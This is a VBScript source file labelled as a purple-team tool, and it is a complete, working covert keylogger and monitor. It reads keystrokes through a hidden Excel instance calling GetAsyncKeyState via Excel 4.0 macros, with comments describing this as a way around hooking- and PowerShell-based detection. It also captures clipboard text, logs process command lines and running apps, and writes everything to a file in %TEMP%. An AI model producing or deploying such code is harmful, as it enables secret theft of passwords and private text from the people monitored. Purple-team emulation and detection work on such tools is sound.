' Purple Team - All-In-One Monitor (Keystrokes + Clipboard + Process + Apps)
' MITRE: T1056.001 (Keylogging), T1115 (Clipboard), T1057 (Process Discovery)
'
' Non-hooking keystroke capture via Excel 4.0 CALL macro (T1204.002)
' Calls GetAsyncKeyState through Excel's XLM engine, not PowerShell
' Falls back to clipboard-only if Excel is not installed
'
' Usage: wscript.exe //nologo //B allmonitor.vbs
'

Dim fso, oShell, oNet
Dim logPath, lastClip, lastProcs, lastWin
Dim keyBuf, hasXL, xl
Dim flushTimer, hbTimer, appTimer

Set fso    = CreateObject("Scripting.FileSystemObject")
Set oShell = CreateObject("WScript.Shell")
Set oNet   = CreateObject("WScript.Network")

logPath   = oShell.ExpandEnvironmentStrings("%TEMP%") & "\log.txt"
lastClip  = ""
lastProcs = ""
lastWin   = ""
keyBuf    = ""

' ── Try to load Excel for keystroke capture ─────────────────────
On Error Resume Next
Set xl = CreateObject("Excel.Application")
If Err.Number = 0 Then
    xl.Visible = False
    xl.DisplayAlerts = False
    xl.ScreenUpdating = False
    hasXL = True
Else
    hasXL = False
End If
Err.Clear
On Error GoTo 0

' ── WMI process watcher ─────────────────────────────────────────
Dim objWMI, watcher
Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
Set watcher = objWMI.ExecNotificationQuery( _
    "SELECT * FROM __InstanceCreationEvent WITHIN 3 " & _
    "WHERE TargetInstance ISA 'Win32_Process'")

' Header
Dim mode
If hasXL Then mode = "FULL (keys+clip+exec+apps)" Else mode = "PARTIAL (clip+exec+apps, no Excel)"
LogIt "[+] AllMonitor started | " & oNet.ComputerName & "\" & oNet.UserName & " | Mode: " & mode

' Timers
Set flushTimer = CreateObject("Scripting.Dictionary")
flushTimer("start") = Timer
Set appTimer = CreateObject("Scripting.Dictionary")
appTimer("start") = Timer

Dim rng
Randomize

' ── Main loop ───────────────────────────────────────────────────
Do While True
    On Error Resume Next

    ' ── Keystroke capture via Excel CALL (non-hooking) ──────────
    If hasXL Then
        Dim shState, isShift, vk, kState, ch

        ' Check shift
        shState = CLng(xl.ExecuteExcel4Macro( _
            "CALL(""user32"",""GetAsyncKeyState"",""JJ"",16)"))
        isShift = ((shState And &H8000) <> 0)

        ' Check common keys: letters, numbers, special
        ' Backspace(8), Tab(9), Enter(13), Space(32)
        Dim checkKeys
        checkKeys = Array(8, 9, 13, 32, _
            48,49,50,51,52,53,54,55,56,57, _
            65,66,67,68,69,70,71,72,73,74,75,76,77, _
            78,79,80,81,82,83,84,85,86,87,88,89,90, _
            186,187,188,189,190,191)

        Dim i
        For i = 0 To UBound(checkKeys)
            vk = checkKeys(i)
            kState = CLng(xl.ExecuteExcel4Macro( _
                "CALL(""user32"",""GetAsyncKeyState"",""JJ""," & vk & ")"))
            If (kState And 1) = 1 Then
                ch = MapKey(vk, isShift)
                If ch <> "" Then keyBuf = keyBuf & ch
            End If
        Next

        ' Flush keystroke buffer every 10-20s
        If (Timer - flushTimer("start")) >= (10 + Int(Rnd * 10)) Then
            If Len(keyBuf) > 0 Then
                Dim winTitle
                winTitle = GetWinTitle()
                If winTitle <> "" And winTitle <> lastWin Then
                    lastWin = winTitle
                    LogIt "[WIN] " & winTitle
                End If
                LogIt "[KEYS] " & keyBuf
                keyBuf = ""
            End If
            flushTimer("start") = Timer
        End If
    End If

    ' ── Process creation events (non-blocking) ──────────────────
    Dim evt
    Set evt = watcher.NextEvent(50)
    If Err.Number = 0 And Not evt Is Nothing Then
        Dim pName, pCmd, pPid
        pName = evt.TargetInstance.Name
        pCmd  = evt.TargetInstance.CommandLine
        pPid  = evt.TargetInstance.ProcessId
        Select Case LCase(pName)
            Case "cmd.exe", "powershell.exe", "pwsh.exe", _
                 "net.exe", "net1.exe", "ipconfig.exe", "whoami.exe", _
                 "tasklist.exe", "systeminfo.exe", "reg.exe", "sc.exe", _
                 "certutil.exe", "mshta.exe", "rundll32.exe", "wmic.exe", _
                 "ssh.exe", "scp.exe", "ftp.exe", "curl.exe", _
                 "notepad.exe", "mstsc.exe", "python.exe"
                LogIt "[EXEC] " & pName & " (PID:" & pPid & ") " & Left(pCmd, 300)
        End Select
    End If
    Err.Clear

    ' ── Clipboard monitoring ────────────────────────────────────
    Dim clipTxt
    clipTxt = GetClipboard()
    If Len(clipTxt) > 0 And clipTxt <> lastClip Then
        lastClip = clipTxt
        LogIt "[CLIP] " & Left(clipTxt, 500)
    End If

    ' ── Active app tracking (every ~15s) ────────────────────────
    If (Timer - appTimer("start")) >= 15 Then
        Dim curProcs
        curProcs = GetUserProcs()
        If curProcs <> lastProcs Then
            lastProcs = curProcs
            LogIt "[APPS] " & curProcs
        End If
        appTimer("start") = Timer
    End If

    On Error GoTo 0

    ' Sleep: 30ms if capturing keys, 2s if clipboard only
    If hasXL Then
        WScript.Sleep 30
    Else
        WScript.Sleep 2000 + Int(Rnd * 1000)
    End If
Loop

' ─────────────────────────────────────────────────────────────────
'  Key mapping
' ─────────────────────────────────────────────────────────────────
Function MapKey(vk, sh)
    MapKey = ""
    Select Case vk
        Case 8:   MapKey = "[BS]"
        Case 9:   MapKey = "[TAB]"
        Case 13:  MapKey = "[EN]"
        Case 32:  MapKey = " "
        Case 48:  If sh Then MapKey = ")" Else MapKey = "0"
        Case 49:  If sh Then MapKey = "!" Else MapKey = "1"
        Case 50:  If sh Then MapKey = "@" Else MapKey = "2"
        Case 51:  If sh Then MapKey = "#" Else MapKey = "3"
        Case 52:  If sh Then MapKey = "$" Else MapKey = "4"
        Case 53:  If sh Then MapKey = "%" Else MapKey = "5"
        Case 54:  If sh Then MapKey = "^" Else MapKey = "6"
        Case 55:  If sh Then MapKey = "&" Else MapKey = "7"
        Case 56:  If sh Then MapKey = "*" Else MapKey = "8"
        Case 57:  If sh Then MapKey = "(" Else MapKey = "9"
        Case 186: If sh Then MapKey = ":" Else MapKey = ";"
        Case 187: If sh Then MapKey = "+" Else MapKey = "="
        Case 188: If sh Then MapKey = "<" Else MapKey = ","
        Case 189: If sh Then MapKey = "_" Else MapKey = "-"
        Case 190: If sh Then MapKey = ">" Else MapKey = "."
        Case 191: If sh Then MapKey = "?" Else MapKey = "/"
    End Select
    ' Letters A-Z
    If vk >= 65 And vk <= 90 Then
        If sh Then
            MapKey = Chr(vk)
        Else
            MapKey = Chr(vk + 32)
        End If
    End If
End Function

' ─────────────────────────────────────────────────────────────────
'  Window title via Excel CALL
' ─────────────────────────────────────────────────────────────────
Function GetWinTitle()
    On Error Resume Next
    GetWinTitle = ""
    If Not hasXL Then Exit Function

    ' Get foreground window process via WMI instead of GetWindowText
    ' (GetWindowText needs string buffer which is hard via CALL)
    Dim wmi, procs, p
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery( _
        "SELECT Name, Caption FROM Win32_Process WHERE SessionId > 0")
    Dim topApp
    topApp = ""
    For Each p In procs
        Select Case LCase(p.Name)
            Case "chrome.exe", "msedge.exe", "firefox.exe", _
                 "notepad.exe", "cmd.exe", "outlook.exe", _
                 "teams.exe", "slack.exe", "winword.exe", _
                 "excel.exe", "code.exe", "mstsc.exe"
                topApp = p.Name
        End Select
    Next
    Set wmi = Nothing
    GetWinTitle = topApp
    On Error GoTo 0
End Function

' ─────────────────────────────────────────────────────────────────
'  Helpers
' ─────────────────────────────────────────────────────────────────
Function GetClipboard()
    On Error Resume Next
    Dim hDoc
    Set hDoc = CreateObject("htmlfile")
    GetClipboard = hDoc.parentWindow.clipboardData.GetData("text")
    Set hDoc = Nothing
    If Err.Number <> 0 Then GetClipboard = ""
    On Error GoTo 0
End Function

Function GetUserProcs()
    On Error Resume Next
    Dim wmi, procs, p, pList, pn
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE SessionId > 0")
    pList = ""
    For Each p In procs
        pn = LCase(p.Name)
        If pn = "chrome.exe" Or pn = "msedge.exe" Or pn = "firefox.exe" Or _
           pn = "notepad.exe" Or pn = "cmd.exe" Or pn = "outlook.exe" Or _
           pn = "teams.exe" Or pn = "slack.exe" Or pn = "winword.exe" Or _
           pn = "excel.exe" Or pn = "code.exe" Or pn = "mstsc.exe" Or _
           pn = "powershell.exe" Or pn = "putty.exe" Then
            If InStr(pList, p.Name) = 0 Then pList = pList & p.Name & " "
        End If
    Next
    Set wmi = Nothing
    GetUserProcs = Trim(pList)
    On Error GoTo 0
End Function

Sub LogIt(msg)
    On Error Resume Next
    Dim f, ts
    ts = Year(Now) & "-" & Right("0" & Month(Now), 2) & "-" & Right("0" & Day(Now), 2) & _
         " " & Right("0" & Hour(Now), 2) & ":" & Right("0" & Minute(Now), 2) & ":" & _
         Right("0" & Second(Now), 2)
    Set f = fso.OpenTextFile(logPath, 8, True)
    f.WriteLine "[" & ts & "] " & msg
    f.Close
    Set f = Nothing
    On Error GoTo 0
End Sub
